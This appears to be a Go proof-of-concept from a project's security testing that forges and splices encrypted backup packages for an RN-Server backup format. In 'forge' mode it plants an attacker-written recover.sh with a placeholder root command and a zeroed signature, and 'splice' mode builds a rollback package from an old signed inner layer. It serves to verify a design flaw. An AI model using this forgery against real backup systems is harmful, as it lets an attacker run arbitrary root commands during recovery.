// 临时攻击验证，用完即删。攻击者手上只有：三把恢复**公钥**（控制台上印着指纹，
// 公钥本身可从配置/任何一次核对仪式拿到）、桶的写权限、以及一份旧备份。
package main

import (
	"archive/tar"
	"bytes"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"time"

	"github.com/Helix2010/RN-Server/internal/backupcontainer"
)

func must(err error) {
	if err != nil {
		panic(err)
	}
}

func pubOf(path string) *rsa.PublicKey {
	raw, err := os.ReadFile(path)
	must(err)
	b, _ := pem.Decode(raw)
	k, err := x509.ParsePKCS8PrivateKey(b.Bytes)
	must(err)
	return &k.(*rsa.PrivateKey).PublicKey
}

func tarFiles(files map[string][]byte) []byte {
	names := []string{}
	for n := range files {
		names = append(names, n)
	}
	sort.Strings(names)
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, n := range names {
		must(tw.WriteHeader(&tar.Header{Name: n, Mode: 0o600, Size: int64(len(files[n])),
			Typeflag: tar.TypeReg, Format: tar.FormatPAX, ModTime: time.Unix(0, 0).UTC()}))
		_, err := tw.Write(files[n])
		must(err)
	}
	must(tw.Close())
	return buf.Bytes()
}

func sha(b []byte) string { s := sha256.Sum256(b); return hex.EncodeToString(s[:]) }

func seal(pub *rsa.PublicKey, layer backupcontainer.Layer, seq uint64, plain []byte) []byte {
	var out bytes.Buffer
	must(backupcontainer.Seal(&out, pub, backupcontainer.Meta{
		Layer: layer, Seq: seq, InstanceID: "prod-1",
		CreatedAt: time.Now().UTC().Format(time.RFC3339),
	}, bytes.NewReader(plain), int64(len(plain))))
	return out.Bytes()
}

func main() {
	dir := os.Args[1]
	mode := os.Args[2]
	A := pubOf(filepath.Join(dir, "A.key"))
	C := pubOf(filepath.Join(dir, "C.key"))

	switch mode {
	case "forge":
		// 从零伪造一个 AC 包：内层、server 层、外层全部自己封，
		// 里面放攻击者写的 recover.sh
		evilInner := tarFiles(map[string][]byte{
			"manifest.json": []byte(`{"format":1,"side":"agent","files":[]}`),
			"agent-key":     []byte("ATTACKER-CONTROLLED"),
		})
		inner := seal(A, backupcontainer.LayerInner, 42, evilInner)
		server := seal(A, backupcontainer.LayerInner, 42, tarFiles(map[string][]byte{
			"manifest.json": []byte(`{"format":1,"side":"server","files":[]}`),
		}))
		evilScript := []byte("#!/bin/bash\n# 伪造的恢复脚本：这里可以是任意 root 命令\nid > /tmp/PWNED-BY-FORGED-RECOVER-SH\necho '恢复完成'\n")
		// 签名文件随便填 64 字节——外层 MAC 不校验它的正确性
		members := map[string][]byte{
			"inner.rnbk":     inner,
			"inner.rnbk.sig": bytes.Repeat([]byte{0}, 64),
			"server.rnbk":    server,
			"RECOVERY.md":    []byte("# 伪造手册\n照着跑 recover.sh 就行。\n"),
			"recover.sh":     evilScript,
		}
		files := []map[string]any{}
		for _, n := range []string{"RECOVERY.md", "inner.rnbk", "inner.rnbk.sig", "recover.sh", "server.rnbk"} {
			files = append(files, map[string]any{"path": n, "size": len(members[n]), "sha256": sha(members[n]),
				"target": "", "mode": "", "owner": ""})
		}
		manifest, _ := json.MarshalIndent(map[string]any{
			"format": 1, "seq": 42, "pair": "AC", "instanceId": "prod-1",
			"createdAt": time.Now().UTC().Format(time.RFC3339),
			"files":     files,
		}, "", "  ")
		members["manifest.json"] = manifest
		outer := seal(C, backupcontainer.LayerOuter, 42, tarFiles(members))
		out := filepath.Join(dir, "forged-00000042-AC.rnbk")
		must(os.WriteFile(out, outer, 0o600))
		fmt.Println("伪造包写出:", out, " sha256:", sha(outer))

	case "splice":
		// 拼接/回滚：拿一份**旧**备份的 inner.rnbk 和它**当时那份合法签名**，
		// 塞进一个新 seq 的外层，manifest 按新内容重算
		oldInner, err := os.ReadFile(filepath.Join(dir, "old", "L1", "inner.rnbk"))
		must(err)
		oldSig, err := os.ReadFile(filepath.Join(dir, "old", "L1", "inner.rnbk.sig"))
		must(err)
		newServer, err := os.ReadFile(filepath.Join(dir, "L1", "server.rnbk"))
		must(err)
		newRecovery, err := os.ReadFile(filepath.Join(dir, "L1", "RECOVERY.md"))
		must(err)
		newScript, err := os.ReadFile(filepath.Join(dir, "L1", "recover.sh"))
		must(err)
		members := map[string][]byte{
			"inner.rnbk": oldInner, "inner.rnbk.sig": oldSig, "server.rnbk": newServer,
			"RECOVERY.md": newRecovery, "recover.sh": newScript,
		}
		files := []map[string]any{}
		for _, n := range []string{"RECOVERY.md", "inner.rnbk", "inner.rnbk.sig", "recover.sh", "server.rnbk"} {
			files = append(files, map[string]any{"path": n, "size": len(members[n]), "sha256": sha(members[n])})
		}
		manifest, _ := json.MarshalIndent(map[string]any{
			"format": 1, "seq": 42, "pair": "AC", "instanceId": "prod-1", "files": files,
		}, "", "  ")
		members["manifest.json"] = manifest
		outer := seal(C, backupcontainer.LayerOuter, 42, tarFiles(members))
		out := filepath.Join(dir, "spliced-00000042-AC.rnbk")
		must(os.WriteFile(out, outer, 0o600))
		fmt.Println("拼接包写出:", out, " sha256:", sha(outer))
	}
}
